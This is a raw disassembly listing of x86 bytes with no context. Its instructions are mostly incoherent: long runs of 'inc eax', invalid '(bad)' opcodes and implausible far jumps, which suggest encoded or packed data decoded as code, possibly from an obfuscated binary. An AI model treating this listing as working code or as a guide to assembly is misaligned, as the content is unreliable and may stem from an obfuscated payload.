  418e51:	inc    eax
  418e52:	inc    eax
  418e53:	cmp    DWORD PTR [ebp+eiz*1+0x43d2f58],esi
  418e5a:	imul   eax,eax,0x2951c125
  418e60:	mov    ch,cl
  418e62:	jge    0x418e65
  418e64:	mov    bh,0xef
  418e66:	dec    eax
  418e67:	xor    al,0xa8
  418e69:	leave  
  418e6a:	xor    al,0x9
  418e6c:	sub    BYTE PTR [ecx+0x53],dl
  418e6f:	and    DWORD PTR [edi+0x6e634426],ebp
  418e75:	rcl    DWORD PTR [edi],0x40
  418e78:	inc    eax
  418e79:	inc    eax
  418e7a:	inc    eax
  418e7b:	inc    eax
  418e7c:	inc    eax
  418e7d:	inc    eax
  418e7e:	inc    eax
  418e7f:	add    BYTE PTR [ebx],ah
  418e81:	cmp    cl,BYTE PTR [ecx+0x2b354922]
  418e87:	add    al,0x29
  418e89:	inc    edi
  418e8a:	jae    0x418ed5
  418e8c:	int3   
  418e8d:	inc    esi
  418e8e:	shl    DWORD PTR [edi+0x40404040],0x40
  418e95:	inc    eax
  418e96:	and    eax,0x2c404040
  418e9b:	pushf  
  418e9c:	mov    edi,0x5d476940
  418ea1:	pop    ds
  418ea2:	xor    BYTE PTR [edx+0x462c55bf],dl
  418ea8:	les    edx,FWORD PTR [ebx]
  418eaa:	xor    BYTE PTR [ecx],ch
  418eac:	mov    edi,0x40404099
  418eb1:	inc    eax
  418eb2:	inc    eax
  418eb3:	inc    eax
  418eb4:	inc    eax
  418eb5:	inc    eax
  418eb6:	inc    eax
  418eb7:	inc    eax
  418eb8:	test   al,0xe0
  418eba:	and    eax,0x2d52131
  418ebf:	cmp    al,0x11
  418ec1:	sbb    BYTE PTR [ebx+edx*1+0x60],bh
  418ec5:	pusha  
  418ec6:	lds    eax,FWORD PTR [edi]
  418ec8:	inc    ecx
  418ec9:	arpl   cx,ax
  418ecb:	outs   dx,DWORD PTR ds:[esi]
  418ecc:	inc    eax
  418ecd:	inc    eax
  418ece:	inc    eax
  418ecf:	inc    eax
  418ed0:	inc    eax
  418ed1:	inc    eax
  418ed2:	rol    DWORD PTR [eax+0x40],0x7a
  418ed6:	inc    eax
  418ed7:	dec    eax
  418ed8:	sbb    al,0x20
  418eda:	loope  0x418f1f
  418edc:	adc    DWORD PTR ds:0x44635062,esp
  418ee2:	xor    eax,0x40004040
  418ee7:	inc    eax
  418ee8:	inc    eax
  418ee9:	inc    eax
  418eea:	inc    eax
  418eeb:	inc    eax
  418eec:	rcl    BYTE PTR [edx+0x30],0xad
  418ef0:	in     al,dx
  418ef1:	shl    DWORD PTR [edx-0x69],0x30
  418ef5:	mov    cl,0x39
  418ef7:	mov    al,ds:0xa8aba844
  418efc:	inc    ebx
  418efd:	inc    esi
  418efe:	adc    al,0x33
  418f00:	sub    al,0x10
  418f02:	movhlps xmm0,xmm0
  418f05:	mov    ah,0x6d
  418f07:	inc    eax
  418f08:	inc    eax
  418f09:	inc    eax
  418f0a:	inc    eax
  418f0b:	inc    eax
  418f0c:	inc    eax
  418f0d:	inc    eax
  418f0e:	inc    eax
  418f0f:	inc    eax
  418f10:	inc    eax
  418f11:	inc    edx
  418f12:	add    BYTE PTR [eax+0x19],cl
  418f15:	in     al,0xad
  418f17:	cs xor al,0x64
  418f1a:	dec    eax
  418f1b:	inc    ecx
  418f1c:	gs adc eax,0x942e732e
  418f22:	popf   
  418f23:	rol    BYTE PTR [edx+0x43],0x6b
  418f27:	xchg   ebx,eax
  418f28:	and    eax,0xc9b84405
  418f2d:	inc    eax
  418f2e:	inc    eax
  418f2f:	inc    eax
  418f30:	inc    eax
  418f31:	inc    eax
  418f32:	inc    eax
  418f33:	int3   
  418f34:	jne    0x418f76
  418f36:	push   ebx
  418f37:	sar    DWORD PTR [ebp+0x622ccd34],0xbc
  418f3e:	and    BYTE PTR [edx+0x77],ah
  418f41:	cs data16 jle 0x418f89
  418f45:	add    eax,0x2f91c144
  418f4a:	aaa    
  418f4b:	int    0x40
  418f4d:	inc    ecx
  418f4e:	and    BYTE PTR [edx+0x40],bl
  418f51:	add    cl,al
  418f53:	inc    eax
  418f54:	inc    eax
  418f55:	inc    eax
  418f56:	inc    eax
  418f57:	add    BYTE PTR [eax+0x49],al
  418f5a:	add    edx,DWORD PTR [edx+0x42]
  418f5d:	sub    BYTE PTR ds:0x4013c16d,bl
  418f63:	lods   al,BYTE PTR ds:[esi]
  418f64:	(bad)  
  418f65:	pop    ebx
  418f66:	dec    esp
  418f67:	mov    dh,0x4d
  418f69:	outs   dx,BYTE PTR ds:[esi]
  418f6a:	dec    eax
  418f6b:	adc    eax,0xa0624144
  418f70:	shl    DWORD PTR [ecx+0x40],0xcb
  418f74:	sub    al,0x99
  418f76:	push   ecx
  418f77:	test   al,0x40
  418f79:	inc    eax
  418f7a:	inc    eax
  418f7b:	inc    eax
  418f7c:	inc    eax
  418f7d:	inc    eax
  418f7e:	inc    eax
  418f7f:	inc    eax
  418f80:	inc    DWORD PTR [eax+0x1d]
  418f83:	push   esp
  418f84:	inc    eax
  418f85:	mov    DWORD PTR [eax+edx*8+0x41],edi
  418f89:	mov    bh,0xc1
  418f8b:	repz inc eax
  418f8d:	jae    0x418f54
  418f8f:	popa   
  418f90:	imul   esi,DWORD PTR [ebx+ebx*2+0x40],0x84a4c48
  418f98:	addr16 test al,0xc1
  418f9b:	nop
  418f9c:	inc    eax
  418f9d:	add    cl,dh
  418f9f:	std    
  418fa0:	jno    0x418ff7
  418fa2:	sbb    ebp,DWORD PTR [ecx]
  418fa4:	inc    eax
  418fa5:	inc    esp
  418fa6:	inc    eax
  418fa7:	inc    eax
  418fa8:	inc    eax
  418fa9:	inc    eax
  418faa:	inc    eax
  418fab:	inc    eax
  418fac:	inc    eax
  418fad:	inc    eax
  418fae:	inc    eax
  418faf:	inc    eax
  418fb0:	push   es
  418fb1:	dec    esi
  418fb2:	les    ebp,FWORD PTR [eax]
  418fb4:	(bad)  
  418fb5:	jae    0x418ff7
  418fb7:	add    eax,0x6bc8e048
  418fbc:	aas    
  418fbd:	adc    al,BYTE PTR [eax-0x1c]
  418fc0:	cmp    eax,0x6d354534
  418fc5:	cs inc eax
  418fc7:	bound  edi,QWORD PTR [edx-0x55]
  418fca:	inc    eax
  418fcb:	inc    eax
  418fcc:	inc    eax
  418fcd:	inc    eax
  418fce:	inc    eax
  418fcf:	inc    eax
  418fd0:	inc    eax
  418fd1:	inc    eax
  418fd2:	add    BYTE PTR [ecx],dh
  418fd4:	inc    ebp
  418fd5:	sar    BYTE PTR [edx-0x432aecc0],0xf7
  418fdc:	dec    eax
  418fdd:	das    
  418fde:	ins    DWORD PTR es:[edi],dx
  418fdf:	jmp    0x41902d
  418fe1:	inc    edi
  418fe2:	pop    edx
  418fe3:	dec    ecx
  418fe4:	inc    esi
  418fe5:	inc    eax
  418fe6:	inc    eax
  418fe7:	inc    eax
  418fe8:	inc    eax
  418fe9:	inc    eax
  418fea:	inc    eax
  418feb:	and    eax,0x45404040
  418ff0:	jae    0x418fdf
  418ff2:	(bad)  
  418ff3:	out    dx,al
  418ff4:	mov    edi,0x51c0e029
  418ff9:	rcr    BYTE PTR ds:0xc9cb6844,cl
  418fff:	pusha  
  419000:	aad    0xa3
  419002:	mov    al,0x2c
  419004:	inc    esp
  419005:	arpl   WORD PTR [esi+0x40],ax
  419008:	inc    eax
  419009:	inc    eax
  41900a:	inc    eax
  41900b:	inc    eax
  41900c:	inc    eax
  41900d:	inc    eax
  41900e:	inc    eax
  41900f:	inc    eax
  419010:	inc    eax
  419011:	outs   dx,BYTE PTR ds:[esi]
  419012:	jno    0x418fe5
  419014:	addr16 js 0x418fd3
  419017:	and    eax,0xce19c381
  41901c:	dec    eax
  41901d:	int    0x6a
  41901f:	sub    ecx,DWORD PTR [eax+0x48]
  419022:	dec    edx
  419023:	cdq    
  419024:	inc    ebx
  419025:	sbb    eax,0xc0a83455
  41902a:	mov    ebx,0x404040d8
  41902f:	inc    eax
  419030:	inc    eax
  419031:	inc    eax
  419032:	rol    DWORD PTR [eax+0x40],0x35
  419036:	neg    ah
  419038:	push   0xa94c2d10
  41903d:	jmp    0xfd3fd286
  419042:	push   edi
  419043:	xor    eax,0x9c2c8cba
  419048:	xor    DWORD PTR ds:0x281f29c2,eax
  41904e:	jbe    0x4190c2
  419050:	bound  eax,QWORD PTR [edx-0x13]
  419053:	push   ebx
  419054:	lods   al,BYTE PTR ds:[esi]
  419055:	inc    eax
  419056:	inc    eax
  419057:	add    BYTE PTR [eax+0x40],al
  41905a:	inc    eax
  41905b:	inc    eax
  41905c:	inc    eax
  41905d:	inc    eax
  41905e:	add    al,ch
  419060:	sbb    al,0x34
  419062:	push   ebx
  419063:	and    dh,BYTE PTR [edi]
  419065:	mov    ecx,0x56d83562
  41906a:	int3   
  41906b:	or     bl,BYTE PTR [edi]
  41906d:	cmp    al,BYTE PTR [edx+eiz*8]
  419070:	or     BYTE PTR [ebp+0x50],dl
  419073:	shl    DWORD PTR [esi],0x65
  419076:	jl     0x419070
  419078:	pop    edi
  419079:	push   edx
  41907a:	inc    eax
  41907b:	jne    0x419078
  41907d:	xchg   esp,eax
  41907e:	bound  esi,QWORD PTR [ecx+eiz*1+0x74]
  419082:	lea    eax,[ecx+0x40]
  419085:	inc    eax
  419086:	inc    eax
  419087:	inc    eax
  419088:	inc    eax
  419089:	inc    eax
  41908a:	inc    eax
  41908b:	inc    eax
  41908c:	inc    eax
  41908d:	inc    eax
  41908e:	mov    edi,0x38dd6e98
  419093:	mov    al,ds:0x60785f6c
  419098:	sub    ah,BYTE PTR [edx-0x44]
  41909b:	addr16 push ecx
  41909d:	inc    eax
  41909e:	pop    ds
  41909f:	in     eax,0x6
  4190a1:	aad    0x40
  4190a3:	inc    eax
  4190a4:	inc    eax
  4190a5:	inc    eax
  4190a6:	inc    eax
  4190a7:	inc    eax
  4190a8:	int3   
  4190a9:	jne    0x4190eb
  4190ab:	test   al,0x58
  4190ad:	test   al,0x32
  4190af:	js     0x4190e5
  4190b1:	ds dec ebx
  4190b3:	jno    0x41905d
  4190b5:	inc    edx
  4190b6:	addr16 pop ds
  4190b8:	(bad)  
  4190b9:	(bad)  
  4190ba:	std    
  4190bb:	xor    ebp,DWORD PTR [eax+0x8]
  4190be:	inc    eax
  4190bf:	aaa    
  4190c0:	inc    eax
  4190c1:	add    cl,al
  4190c3:	inc    eax
  4190c4:	inc    eax
  4190c5:	inc    eax
  4190c6:	inc    eax
  4190c7:	add    BYTE PTR [eax-0xc],al
  4190ca:	les    eax,FWORD PTR [edx+eiz*2+0x41]
  4190ce:	fisubr DWORD PTR [ecx]
  4190d0:	jg     0x419080
  4190d2:	dec    edi
  4190d3:	sub    al,0xb0
  4190d5:	outs   dx,DWORD PTR ds:[esi]
  4190d6:	jmp    0x4190e5
  4190d8:	inc    eax
  4190d9:	push   edi
  4190da:	xor    esi,DWORD PTR [edx+0x64]
  4190dd:	mov    al,ds:0xa2514528
  4190e2:	jmp    0x4040:0x40404040
  4190e9:	inc    eax
  4190ea:	inc    eax
  4190eb:	inc    DWORD PTR [eax-0x33]
  4190ee:	push   ebp
  4190ef:	cld    
  4190f0:	imul   esi,DWORD PTR ds:0x15632d54,0x3c
  4190f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190f8:	xor    eax,0x1b20bf5d
  4190fd:	cli    
  4190fe:	mov    ah,0x41
  419100:	inc    esp
  419101:	inc    ecx
  419102:	dec    esi
  419103:	sbb    dl,BYTE PTR [eax+eax*2+0x40404040]
  41910a:	inc    eax
  41910b:	inc    eax
  41910c:	inc    eax
  41910d:	inc    eax
  41910e:	inc    eax
  41910f:	inc    esp
  419110:	xor    al,0x2
  419112:	inc    edi
  419113:	imul   edi,DWORD PTR [ebp+0x622c1cf0],0xf434667
  41911d:	stos   DWORD PTR es:[edi],eax
  41911e:	fidiv  DWORD PTR [eax-0x4c]
  419121:	xor    eax,0x99b157ec
  419126:	test   al,0xc5
  419128:	adc    eax,0x4540fa35
  41912d:	adc    BYTE PTR [edx],0x12
  419130:	leave  
  419131:	test   BYTE PTR [esi+0x33],al
  419134:	inc    eax
  419135:	inc    eax
  419136:	inc    eax
  419137:	inc    eax
  419138:	inc    eax
  419139:	inc    eax
  41913a:	inc    eax
  41913b:	inc    eax
  41913c:	add    cl,dh
  41913e:	cwde   
  41913f:	mov    al,0xe2
  419141:	mov    al,0x8e
  419143:	lea    eax,ds:0x444293bf
  419149:	inc    ecx
  41914a:	xchg   ecx,eax
  41914b:	jns    0x41918f
  41914d:	inc    ebx
  41914e:	fild   WORD PTR [edi]
  419150:	sub    al,0x42
  419152:	mov    edi,0x49302ca8
  419157:	fsubr  DWORD PTR [esi-0x4]
  41915a:	enter  0x2d11,0x40
  41915e:	inc    eax
  41915f:	inc    eax
  419160:	inc    eax
  419161:	inc    eax
  419162:	inc    eax
  419163:	and    eax,0x29404040
  419168:	inc    eax
  419169:	arpl   bp,dx
  41916b:	outs   dx,BYTE PTR ds:[esi]
  41916c:	mov    edx,0x706341ee
  419171:	inc    ecx
  419172:	andps  xmm4,XMMWORD PTR [edx-0x39]
  419176:	dec    ebp
  419177:	icebp  
  419178:	pop    ebx
  419179:	inc    ecx
  41917a:	into   
  41917b:	push   ebp
  41917c:	enter  0x41cd,0x76
  419180:	mov    al,0x40
  419182:	inc    eax
  419183:	inc    eax
  419184:	inc    eax
  419185:	inc    eax
  419186:	inc    eax
  419187:	inc    eax
  419188:	inc    eax
  419189:	inc    eax
  41918a:	inc    eax
  41918b:	or     al,0x1f
  41918d:	fld    QWORD PTR [esi+0x10]
  419190:	stos   DWORD PTR es:[edi],eax
  419191:	icebp  
  419192:	push   0xffffffcd
  419194:	inc    esp
  419195:	shr    BYTE PTR [ecx],0xbc
  419198:	or     DWORD PTR [eax-0x50],edi
  41919b:	mov    ah,0x2d
  41919d:	clc    
  41919e:	inc    edx
  41919f:	add    eax,0x500b541
  4191a4:	ins    BYTE PTR es:[edi],dx
  4191a5:	or     ch,BYTE PTR [esi+0x41]
  4191a8:	loope  0x419218
  4191aa:	fcmove st,st(3)
  4191ac:	int    0x8c
  4191ae:	inc    eax
  4191af:	inc    eax
  4191b0:	inc    eax
  4191b1:	inc    eax
  4191b2:	inc    eax
  4191b3:	inc    eax
  4191b4:	rol    DWORD PTR [eax+0x40],0x39
  4191b8:	inc    eax
  4191b9:	inc    edx
  4191ba:	xor    al,BYTE PTR [ebx+0x4a]
  4191bd:	dec    edx
  4191be:	arpl   bp,cx
  4191c0:	mov    WORD PTR [esi],?
  4191c2:	mov    edx,0xbee43a5
  4191c7:	inc    eax
  4191c8:	outs   dx,BYTE PTR ds:[esi]
  4191c9:	pop    edi
  4191ca:	inc    ebx
  4191cb:	sub    DWORD PTR [esp+eax*2-0x24],ecx
  4191cf:	push   eax
  4191d0:	add    eax,0x15b55142
  4191d5:	sub    al,0x54
  4191d7:	inc    eax
  4191d8:	test   al,0x25
  4191da:	std    
  4191db:	inc    eax
  4191dc:	inc    eax
  4191dd:	add    BYTE PTR [eax+0x40],al
  4191e0:	inc    eax
  4191e1:	inc    eax
  4191e2:	inc    eax
  4191e3:	inc    eax
  4191e4:	(bad)  
  4191e6:	push   0x3d
  4191e8:	shl    BYTE PTR [ecx-0x452e9f9f],0xc5
  4191ef:	ret    
  4191f0:	sub    BYTE PTR [esi],ch
  4191f2:	inc    edx
  4191f3:	push   ebx
  4191f4:	fadd   DWORD PTR [edx+0x33]
  4191f7:	jo     0x41920b
  4191f9:	xchg   edi,eax
  4191fa:	das    
  4191fb:	sbb    DWORD PTR [eax+0x40],eax
  4191fe:	inc    eax
  4191ff:	inc    eax
  419200:	inc    eax
  419201:	inc    eax
  419202:	inc    eax
  419203:	inc    eax
  419204:	inc    eax
  419205:	inc    eax
  419206:	cs or  al,0xfe
  419209:	and    ecx,DWORD PTR [eax+0x61bb47a0]
  41920f:	int    0x44
  419211:	dec    ebp
  419212:	adc    eax,0x40194028
  419217:	inc    eax
  419218:	inc    eax
  419219:	inc    eax
  41921a:	inc    eax
  41921b:	inc    eax
  41921c:	int3   
  41921d:	jne    0x41925f
  41921f:	push   ds
  419220:	dec    ebp
  419221:	sub    al,0x38
  419223:	int    0x6e
  419225:	xchg   ebp,eax
  419226:	mov    edi,0x568039d
  41922b:	adc    DWORD PTR ds:0xd4bb7032,esi
  419231:	aad    0xa8
  419233:	test   al,0x43
  419235:	jmp    0x420ca52f
  41923a:	adc    BYTE PTR ds:0x92464147,cl
  419240:	dec    eax
  419241:	out    dx,al
  419242:	mov    al,0x40
  419244:	add    cl,al
  419246:	inc    eax
  419247:	inc    eax
  419248:	inc    eax
  419249:	inc    eax
  41924a:	add    BYTE PTR [eax-0x33],al
  41924d:	push   eax
  41924e:	or     eax,0x44115a95
  419253:	inc    ecx
  419254:	inc    eax
  419255:	enter  0xc740,0x61
  419259:	ja     0x419287
  41925b:	push   ebp
  41925c:	sub    al,BYTE PTR [ecx+0x29]
  41925f:	mov    dl,0x43
  419261:	sbb    esp,DWORD PTR [esi-0x4]
  419264:	dec    ebp
  419265:	scas   al,BYTE PTR es:[edi]
  419266:	pusha  
  419267:	pusha  
  419268:	pop    eax
  419269:	(bad)  
  41926a:	int    0x40
  41926c:	inc    eax
  41926d:	inc    eax
  41926e:	inc    eax
  41926f:	inc    eax
  419270:	inc    eax
  419271:	inc    eax
  419272:	inc    eax
  419273:	inc    DWORD PTR [eax+0x46]
  419276:	sub    eax,DWORD PTR [esi+0x59]
  419279:	jle    0x419299
  41927b:	xor    al,0x11
  41927d:	and    BYTE PTR [esi+ecx*4+0x40],cl
  419281:	inc    edx
  419282:	jp     0x419218
  419284:	jmp    0x48f1:0x2c2d63cc
  41928b:	bound  eax,QWORD PTR [esp+ebx*8+0x24]
  41928f:	test   al,0x20
  419291:	inc    ebp
  419292:	inc    eax
  419293:	inc    eax
  419294:	inc    eax
  419295:	inc    eax
  419296:	inc    eax
  419297:	inc    eax
  419298:	inc    eax
  419299:	inc    eax
  41929a:	inc    eax
  41929b:	inc    eax
  41929c:	inc    esp
  41929e:	sub    al,0x7e
  4192a0:	ins    BYTE PTR es:[edi],dx
  4192a1:	adc    ch,BYTE PTR [ebp-0x2f]
  4192a4:	xchg   edx,eax
  4192a5:	dec    edi
  4192a6:	fs or  al,0x62
  4192a9:	std    
  4192aa:	inc    eax
  4192ab:	int    0x82
  4192ad:	inc    eax
  4192ae:	lds    esp,FWORD PTR [edx+0x0]
  4192b1:	cmp    eax,DWORD PTR [eax+0x40]
  4192b4:	inc    eax
  4192b5:	inc    eax
  4192b6:	inc    eax
  4192b7:	inc    eax
  4192b8:	inc    eax
  4192b9:	inc    eax
  4192ba:	add    BYTE PTR [ecx],ah
  4192bc:	icebp  
  4192bd:	loopne 0x419277
  4192bf:	and    al,0x6
  4192c1:	imul   edx,ebp,0x49
  4192c4:	or     eax,0x8ce641e7
  4192c9:	pop    ecx
  4192ca:	int    0x42
  4192cc:	jb     0x4192f8
  4192ce:	jae    0x419314
  4192d0:	cmp    eax,0x40404040
  4192d5:	inc    eax
  4192d6:	inc    eax
  4192d7:	and    eax,0x62404040
  4192dc:	adc    DWORD PTR [eax+eiz*2],esi
  4192df:	mov    esp,esp
  4192e1:	sub    al,0x89
  4192e3:	sub    bh,BYTE PTR [ebp+ecx*2+0x4063126c]
  4192ea:	inc    eax
  4192eb:	inc    eax
  4192ec:	inc    eax
  4192ed:	inc    eax
  4192ee:	inc    eax
  4192ef:	inc    eax
  4192f0:	inc    eax
  4192f1:	inc    eax
  4192f2:	inc    eax
  4192f3:	(bad)  
  4192f5:	add    DWORD PTR ds:0x54e07340,ecx
  4192fb:	aad    0x67
  4192fd:	test   DWORD PTR [edx+0x24],eax
  419300:	inc    edx
  419301:	imul   edx,esp,0x4090bc2f
  419307:	inc    ebx
  419308:	push   ecx
  419309:	push   edx
  41930a:	psrad  mm0,QWORD PTR [eax+0x40]
  41930e:	inc    eax
  41930f:	inc    eax
  419310:	inc    eax
  419311:	inc    eax
  419312:	rol    DWORD PTR [eax+0x40],0x71
  419316:	mov    edi,0xe60c408c
  41931b:	test   al,0xfa
  41931d:	out    dx,eax
  41931e:	ins    BYTE PTR es:[edi],dx
  41931f:	outs   dx,BYTE PTR ds:[esi]
  419320:	sub    DWORD PTR [ecx+0x40],edx
  419323:	inc    eax
  419324:	add    BYTE PTR [eax+0x40],al
  419327:	inc    eax
  419328:	inc    eax
  419329:	inc    eax
  41932a:	inc    eax
  41932b:	push   es
  41932c:	push   edx
  41932d:	mov    edi,0xea39003c
  419332:	mov    bh,0xf7
  419334:	cmp    BYTE PTR [edi+0x5da841db],0x6
  41933b:	ret    0xbf15
  41933e:	sub    BYTE PTR [ecx-0x19],cl
  419341:	inc    ecx
  419342:	push   ecx
  419343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419344:	int    0x60
  419346:	sbb    al,0x20
  419348:	pushf  
  419349:	push   ebx
  41934a:	inc    ecx
  41934b:	test   DWORD PTR [eax+0x40],eax
  41934e:	inc    eax
  41934f:	inc    eax
  419350:	inc    eax
  419351:	inc    eax
  419352:	inc    eax
  419353:	inc    eax
  419354:	inc    eax
  419355:	inc    eax
  419356:	dec    edi
  419357:	int    0x80
  419359:	jne    0x419389
  41935b:	inc    ecx
  41935c:	push   ecx
  41935d:	out    dx,eax
  41935e:	xor    eax,0x33a86243
  419363:	dec    ecx
  419364:	inc    eax
  419365:	inc    eax
  419366:	inc    eax
  419367:	inc    eax
  419368:	inc    eax
  419369:	inc    eax
  41936a:	int3   
  41936b:	jne    0x4193ad
  41936d:	bound  esp,QWORD PTR [ebx+0x12512c43]
  419373:	sub    BYTE PTR [eax-0x2f],al
  419376:	cmp    eax,0xa8dc8c48
  41937b:	outs   dx,BYTE PTR ds:[esi]
  41937c:	xor    eax,0xbf3dcf27
  419381:	inc    eax
  419382:	inc    ecx
  419383:	xor    eax,0x40429441
  419388:	add    cl,al
  41938a:	inc    eax
  41938b:	inc    eax
  41938c:	inc    eax
  41938d:	inc    eax
  41938e:	add    BYTE PTR [eax-0x3d],al
  419391:	mov    edi,0x404264ac
  419396:	ss addr16 push ebp
  419399:	mov    edi,0x3447fc34
  41939e:	pop    edx
  41939f:	sbb    eax,DWORD PTR [edi+0x5e]
  4193a2:	cmp    al,0x77
  4193a4:	inc    esi
  4193a5:	add    edx,edx
  4193a7:	fmul   st,st(2)
  4193a9:	inc    eax
  4193aa:	inc    eax
  4193ab:	inc    eax
  4193ac:	inc    eax
  4193ad:	inc    eax
  4193ae:	inc    eax
  4193af:	inc    eax
  4193b0:	inc    eax
  4193b1:	inc    DWORD PTR [eax-0x3b]
  4193b4:	inc    edx
  4193b5:	fsub   st(4),st
  4193b7:	inc    eax
  4193b8:	xor    ebx,DWORD PTR [esi]
  4193ba:	add    BYTE PTR [edx+0x4c],0x63
  4193be:	bound  esi,QWORD PTR [edx]
  4193c0:	dec    ebp
  4193c1:	push   edx
  4193c2:	bound  eax,QWORD PTR ds:0xaa49776d
  4193c8:	xchg   ecx,eax
  4193c9:	ds inc edi
  4193cb:	hlt    
  4193cc:	inc    edi
  4193cd:	clc    
  4193ce:	cdq    
  4193cf:	inc    eax
  4193d0:	mov    ch,0x62
  4193d2:	inc    eax
  4193d3:	inc    eax
  4193d4:	inc    eax
  4193d5:	inc    eax
  4193d6:	inc    eax
  4193d7:	inc    eax
  4193d8:	inc    eax
  4193d9:	inc    eax
  4193da:	inc    eax
  4193db:	inc    eax
  4193dc:	cwde   
  4193dd:	clc    
  4193de:	push   edx
  4193df:	gs loope 0x419416
  4193e2:	pop    eax
  4193e3:	push   0x53
  4193e5:	mov    edi,0xe2a80569
  4193ea:	cmp    eax,0x52bf0e74
  4193ef:	xchg   DWORD PTR [eax],edx
  4193f1:	inc    esp
  4193f2:	dec    ebx
  4193f3:	out    0x40,eax
  4193f5:	inc    eax
  4193f6:	inc    eax
  4193f7:	inc    eax
  4193f8:	inc    eax
  4193f9:	inc    eax
  4193fa:	inc    eax
  4193fb:	inc    eax
  4193fc:	add    BYTE PTR [eax-0x41],dh
  4193ff:	mov    edi,0x922c8a90
  419404:	das    
  419405:	push   edx
  419406:	pop    esp
  419407:	add    al,0xd
  419409:	iret   
  41940a:	jmp    0xc910:0xd5e4db24
  419411:	int    0x43
  419413:	add    DWORD PTR [eax+eax*2],esp
  419416:	inc    eax
  419417:	inc    eax
  419418:	inc    eax
  419419:	inc    eax
  41941a:	inc    eax
  41941b:	and    eax,0x5404040
  419420:	inc    ebx
  419421:	dec    eax
  419422:	mov    al,ds:0x99f4da12
  419427:	int    0x27
  419429:	and    ecx,DWORD PTR ds:0x761542bc
  41942f:	push   ecx
  419430:	in     al,0xf4
  419432:	int    0x15
  419434:	ins    BYTE PTR es:[edi],dx
  419435:	pop    ecx
  419436:	inc    ebx
  419437:	xor    eax,0xcd45a8fa
  41943c:	sbb    bl,cl
  41943e:	mov    BYTE PTR [edx+0x44],al
  419441:	adc    DWORD PTR [ebx+edx*2],eax
  419444:	push   edx
  419445:	arpl   WORD PTR [eax+0x40],ax
  419448:	inc    eax
  419449:	inc    eax
  41944a:	inc    eax
  41944b:	inc    eax
  41944c:	inc    eax
  41944d:	inc    eax
  41944e:	inc    eax
  41944f:	inc    eax
  419450:	sti    
  419451:	test   DWORD PTR [ebp+0x48],ecx
  419454:	mov    eax,0x39576d43
  419459:	test   dh,dl
  41945b:	inc    ecx
  41945c:	push   edx
  41945d:	dec    ecx
  41945e:	inc    eax
  41945f:	inc    eax
  419460:	inc    eax
  419461:	inc    eax
  419462:	inc    eax
  419463:	inc    eax
  419464:	rol    DWORD PTR [eax+0x40],0xb2
  419468:	sbb    DWORD PTR [ecx-0x6bcbd39e],ecx
  41946e:	int3   
  41946f:	inc    eax
  419470:	icebp  
  419471:	sbb    ch,BYTE PTR [eax+ebp*4-0x14]
  419475:	add    eax,0x40972940
  41947a:	inc    eax
  41947b:	add    BYTE PTR [eax+0x40],al
  41947e:	inc    eax
  41947f:	inc    eax
  419480:	inc    eax
  419481:	inc    eax
  419482:	(bad)  [ebx+0x28876211]
  419488:	adc    dh,BYTE PTR cs:[ebp-0x4c]
  41948c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41948d:	pusha  
  41948e:	outs   dx,DWORD PTR ds:[esi]
  41948f:	addr16 inc esp
  419491:	sar    DWORD PTR [ecx-0x4c97f2eb],1
  419497:	in     eax,dx
  419498:	jg     0x4194f0
  41949a:	arpl   cx,cx
  41949c:	retf   
  41949d:	bound  esp,QWORD PTR [edx-0x58]
  4194a0:	inc    eax
  4194a1:	adc    DWORD PTR [edx+0x404090c0],edx
  4194a7:	inc    eax
  4194a8:	inc    eax
  4194a9:	inc    eax
  4194aa:	inc    eax
  4194ab:	inc    eax
  4194ac:	inc    eax
  4194ad:	inc    eax
  4194ae:	inc    eax
  4194af:	mov    eax,0x422f2a8c
  4194b4:	mov    DWORD PTR [ebx-0x41],0xc2a60515
  4194bb:	shr    BYTE PTR [esi-0x78369737],1
  4194c1:	fild   WORD PTR [ecx+0x5]
  4194c4:	data16 rol BYTE PTR [eax],1
  4194c7:	mov    ah,0x75
  4194c9:	inc    edx
  4194ca:	push   ecx
  4194cb:	ins    DWORD PTR es:[edi],dx
  4194cc:	ins    BYTE PTR es:[edi],dx
  4194cd:	les    eax,FWORD PTR [edi+0x41]
  4194d0:	sub    BYTE PTR [bp+si],cl
  4194d3:	cmp    eax,DWORD PTR [eax+0x40]
  4194d6:	inc    eax
  4194d7:	inc    eax
  4194d8:	inc    eax
  4194d9:	inc    eax
  4194da:	int3   
  4194db:	jne    0x41951d
  4194dd:	ror    DWORD PTR ds:0x6e624643,1
  4194e3:	inc    eax
  4194e4:	ins    DWORD PTR es:[edi],dx
  4194e5:	aam    0x1f
  4194e7:	sub    ah,bh
  4194e9:	mov    BYTE PTR ds:0x40373f35,dh
  4194ef:	add    cl,al
  4194f1:	inc    eax
  4194f2:	inc    eax
  4194f3:	inc    eax
  4194f4:	inc    eax
  4194f5:	add    BYTE PTR [eax+0x32],al
  4194f8:	fisubr DWORD PTR [esi+0x5]
  4194fb:	inc    ecx
  4194fc:	inc    eax
  4194fd:	ins    DWORD PTR es:[edi],dx
  4194fe:	sub    DWORD PTR [edi],edi
  419500:	test   al,0x4c
  419502:	xchg   DWORD PTR [edi+0x31],eax
  419505:	aas    
  419506:	daa    
  419507:	fcom   QWORD PTR [edx]
  419509:	jne    0x41950f
  41950b:	inc    ebx
  41950c:	ins    WORD PTR es:[edi],dx
  41950e:	aaa    
  41950f:	inc    eax
  419510:	inc    eax
  419511:	inc    eax
  419512:	inc    eax
  419513:	inc    eax
  419514:	inc    eax
  419515:	inc    eax
  419516:	inc    eax
  419517:	inc    DWORD PTR [eax+0x52]
  41951a:	pop    eax
  41951b:	fld    QWORD PTR [edi+0x6d3f42e8]
  419521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419522:	inc    ecx
  419523:	bound  edx,QWORD PTR gs:[esi]
  419526:	and    ebp,DWORD PTR [edi-0x5f93cb95]
  41952c:	sbb    BYTE PTR [ecx+0x6c576d4c],ch
  419532:	mov    BYTE PTR [ebp+0x34],ah
  419535:	inc    eax
  419536:	inc    eax
  419537:	aas    
  419538:	push   0xffffff84
  41953a:	bound  edx,QWORD PTR [ecx]
  41953c:	add    BYTE PTR [edx+0x40404040],0x40
  419543:	inc    eax
  419544:	inc    eax
  419545:	inc    eax
  419546:	inc    eax
  419547:	inc    eax
  419548:	es ins DWORD PTR es:[edi],dx
  41954a:	xchg   ecx,eax
  41954b:	addr16 mov ebx,0xca67f638
  419551:	aas    
  419552:	not    BYTE PTR [edx+0x404f7593]
